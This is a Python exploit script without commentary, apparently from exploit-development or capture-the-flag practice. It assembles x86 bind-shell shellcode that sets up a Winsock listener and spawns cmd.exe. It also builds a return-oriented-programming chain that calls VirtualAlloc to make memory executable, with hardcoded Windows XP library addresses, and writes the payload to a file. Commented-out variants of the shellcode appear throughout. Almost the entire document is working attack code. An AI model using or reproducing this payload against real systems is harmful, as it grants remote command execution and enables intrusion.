from struct import pack

shellcode = "\x90"*0x10
'''
shellcode += "\x68\x6C\x6C\x00\x00\x68\x33\x32\x2E\x64\x68\x77\x73\x32\x5F\x8B\xC4\x50\xC7\xC0\x7B\x1D\x80\x7C\xFF\xD0"
shellcode += "\x83\xC4\xEC\x33\xC0\x50\x50\x50\x6A\x06"
shellcode += "\x6A\x01\x6A\x02\xB8"
shellcode +="\x6A\x8B\xA2\x71" # address of WSASocketA()
shellcode +="\xFF\xD0\x8B\xD8\x33\xC0\x89\x45\xF4\xB0"
shellcode +="\x02\x66\x89\x45\xF0\x66\xC7\x45\xF2\xE5"
shellcode +="\xC5\x6A\x10\x8D\x55\xF0\x52\x53\xB8"
shellcode +="\x80\x44\xA2\x71" # address of bind()
shellcode +="\xFF\xD0\x6A\x01\x53\xB8"
shellcode +="\xD3\x8C\xA2\x71" # address of listen()
shellcode +="\xFF\xD0\x33\xC0\x50\x50\x53\xB8"
shellcode +="\x40\x10\xA3\x71" # address of accept()
shellcode +="\xFF\xD0\x8B\xD8\xBA"
shellcode +="\x63\xD3\x81\x7C" # address of SetStdHandle()
shellcode +="\x53\x6A\xF6\xFF\xD2\x53\x6A\xF5\xFF\xD2"
shellcode +="\x53\x6A\xF4\xFF\xD2\xC7\x45\xFB\x41\x63"
shellcode +="\x6D\x64\x8D\x45\xFC\x50\xB8"
shellcode +="\xC7\x93\xBF\x77" # address of system()
shellcode +="\xFF\xD0"
'''
#shellcode += "hll\x00\x00h32.dhws2_\x8b\xc4P\xc7\xc0{\x1d\x80|\xff\xd0\x81\xec\x00\x04\x00\x00Th\x01\x01\x00\x00\xc7\xc0Uj\xa2q\xff\xd0j\x00j\x00j\x00j\x00j\x01j\x02\xc7\xc0j\x8b\xa2q\xff\xd0\x8b\xd8j\x00j\x00hDD\x00\x00\x8b\xf4j\x10VS\xc7\xc0\x80D\xa2q\xff\xd0j\x00S\xc7\xc0\xd3\x8c\xa2q\xff\xd0j\x00VS\xc7\xc0@\x10\xa3q\xff\xd0"
#shellcode += "hll\x00\x00h32.dhws2_\x8b\xc4P\xc7\xc0{\x1d\x80|\xff\xd0\x81\xec\x00\x04\x00\x00Th\x01\x01\x00\x00\xc7\xc0Uj\xa2q\xff\xd0j\x00j\x00j\x00j\x00j\x01j\x02\xc7\xc0j\x8b\xa2q\xff\xd0\x8b\xd8j\x00j\x00h\\\x11\x00\x00\x8b\xf4j\x10VS\xc7\xc0\x80D\xa2q\xff\xd0j\x00S\xc7\xc0\xd3\x8c\xa2q\xff\xd0j\x00VS\xc7\xc0@\x10\xa3q\xff\xd0"
#shellcode += "hll\x00\x00h32.dhws2_\x8b\xc4P\xc7\xc0{\x1d\x80|\xff\xd0\x81\xec\x00\x04\x00\x00Th\x01\x01\x00\x00\xc7\xc0Uj\xa2q\xff\xd0j\x00j\x00j\x00j\x00j\x01j\x02\xc7\xc0j\x8b\xa2q\xff\xd0\x8b\xd8j\x00j\x00h\x11\\\x00\x00\x8b\xf4j\x10VS\xc7\xc0\x80D\xa2q\xff\xd0j\x00S\xc7\xc0\xd3\x8c\xa2q\xff\xd0j\x00VS\xc7\xc0@\x10\xa3q\xff\xd0"
#shellcode += "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x78\x10\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x83\xec\x20\x8d\x34\x24\x66\xb9\x94\x02\x8b\x53\x1c\x01\xfa\x8b\x04\x0a\x01\xf8\x89\x06\x66\xb9\x68\x04\x8b\x04\x0a\x01\xf8\x89\x46\x04\x66\xb9\xf0\x0c\x8b\x04\x0a\x01\xf8\x31\xc9\x68\x6c\x6c\x41\x41\x66\x89\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x8d\x1c\x24\x53\xff\xd0\x89\xc7\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x8b\x53\x1c\x01\xfa\x31\xc9\x66\xb9\xc8\x01\x8b\x04\x0a\x01\xf8\x89\x46\x08\x66\xb9\x88\x01\x8b\x04\x0a\x01\xf8\x89\x46\x0c\x8b\x42\x04\x01\xf8\x89\x46\x10\x8b\x42\x30\x01\xf8\x89\x46\x14\x8b\x02\x01\xf8\x89\x46\x18\x8b\x42\x50\x01\xf8\x89\x46\x1c\x66\xb9\x90\x01\x29\xcc\x8d\x1c\x24\x66\xb9\x02\x02\x53\x51\xff\x56\x08\x31\xc9\x51\x51\x51\xb1\x06\x51\x83\xe9\x05\x51\x41\x51\xff\x56\x0c\x89\xc7\x99\xb2\x02\x52\x4a\x52\x8d\x0c\x24\xb2\x04\x51\x52\x66\xba\xff\xff\x52\x57\xff\x56\x1c\x99\x52\x52\x52\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\x8d\x0c\x24\xb2\x10\x52\x51\x57\xff\x56\x10\x99\x42\x52\x57\xff\x56\x14\x99\x52\x52\x52\x52\xb2\x10\x8d\x0c\x24\x52\x8d\x1c\x24\x53\x51\x57\xff\x56\x18\x89\xc7\x99\x83\xec\x10\x8d\x1c\x24\x57\x57\x57\x52\x52\xb2\xff\x42\x52\x99\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\xb2\x44\x52\x8d\x0c\x24\x99\x68\x65\x78\x65\x41\x88\x54\x24\x03\x68\x63\x6d\x64\x2e\x8d\x04\x24\x53\x51\x52\x52\x52\x42\x52\x99\x52\x52\x50\x52\xff\x16\x50\xff\x56\x04"
shellcode += "hll\x00\x00h32.dhws2_\x8b\xc4P\xc7\xc0{\x1d\x80|\xff\xd0\x81\xec\x00\x04\x00\x00Th\x01\x01\x00\x00\xc7\xc0Uj\xa2q\xff\xd0j\x00j\x00j\x00j\x06j\x01j\x02\xc7\xc0j\x8b\xa2q\xff\xd0\x8b\xd8\xc7\xc2\x02\x00\x00\x00RJR\x8d\x0c$\xc7\xc2\x04\x00\x00\x00QR\xc7\xc2\xff\xff\x00\x00RS\xc7\xc0!E\xa2q\xff\xd0j\x00j\x00j\x00j\x00\xc6\x04$\x02f\xc7D$\x02\x11\\\x8d\x0c$j\x10QS\xc7\xc0\x80D\xa2q\xff\xd0j\x01S\xc7\xc0\xd3\x8c\xa2q\xff\xd0\xc7\xc2\x10\x00\x00\x00R\x8d<$WQS\xc7\xc0@\x10\xa3q\xff\xd0"
#shellcode += "hll\x00\x00hrt.dhmsvc\x8b\xc4P\xc7\xc0{\x1d\x80|\xff\xd0hexe\x00hcmd.\x8b\xc4P\xc7\xc0\xc7\x93\xbfw\xff\xd0"
shellcode += "\x99\x8b\xf8\x83\xec\x10\x8d\x1c$WWWj\x10j\x10\xc7\xc2\xff\x00\x00\x00BR\x99RRRRRRRRRR\xc7\xc2D\x00\x00\x00R\x8d\x0c$\x99hexe\x00hcmd.\x8d\x04$SQRRRBR\x99RRPR\xc7\xc0k#\x80|\xff\xd0"

rop = '233'.ljust(0x10,' ')
rop += 0x80*'A'
rop += '\x00'*4
rop += 'BBBB'
rop += pack('<L',0x7c809ae1)	# VirtualAlloc
rop += pack('<L',0x4011fc)	# ADD ESP,0x4;POP EBP;RETN;
rop += pack('<L',0x0)			# WrittenAddr -> 0x0
rop += pack('<L',0x100)		# dwSize -> 0x100
rop += pack('<L',0x1000)		# flAllocationType ->MEM_COMMIT
rop += pack('<L',0x40)		# flProtect -> MEM_EXECUTE_READWRITE
rop += pack('<L',0x01010101)
rop += pack('<L',0x02020202)
rop += pack('<L',0x7c8409d4)	# ..XCHG EAX,EDX;RETN;				#arg0
rop += pack('<L',0x7c921726)	# MOV EAX,EDX;
rop += pack('<L',0x7c9259c8)	# XCHG EAX,EBX;RETN;
rop += pack('<L',0x7c96ef6b)	# POP EBP;RETN;
rop += pack('<L',0x0)
rop += pack('<L',0x7c87f229)	# POP EAX;RETN;
rop += pack('<L',0x401020)
rop += pack('<L',0x7c99123c)	# ..POP ECX;RETN;					#arg1
rop += pack('<L',0x400)
rop += pack('<L',0x7c922486)	# POP EDI;RETN;
#rop += pack('<L',0x7c9700bc)	# RETN 0x4;
#rop += pack('<L',0x401139)	# RETN;
rop += pack('<L',0x7c96fe65)	# RETN 0x8;
rop += pack('<L',0x7c94261e)	# POP ESI;RETN;
rop += pack('<L',0x7c974f40)	# JMP EAX;
rop += pack('<L',0x7c96d22b)	# PUSHAD;RETN;
rop += pack('<L',0x7c96fe65)	# RETN 0x8;
#rop += pack('<L',0x404a1d)	# PUSH EAX;RETN;
#rop += pack('<L',0x40d511)	# MOV EBP,ESP;MOV EAX,1;POP EBP;RETN;
rop += shellcode

# PUSHAD -> puroph eax ecx edx ebx eropp ebp eropi edi

rop += '\x1a'
f = open('test','wb')
f.write(rop)
f.close()

#rop += pack('<L',0x7c933834)	# JMP ECX
#rop += pack('<L',0x7c92e435)	# CALL EAX;
#rop += pack('<L',0x7c9259c8)	#..XCHG EAX,EBX;RETN;				#arg0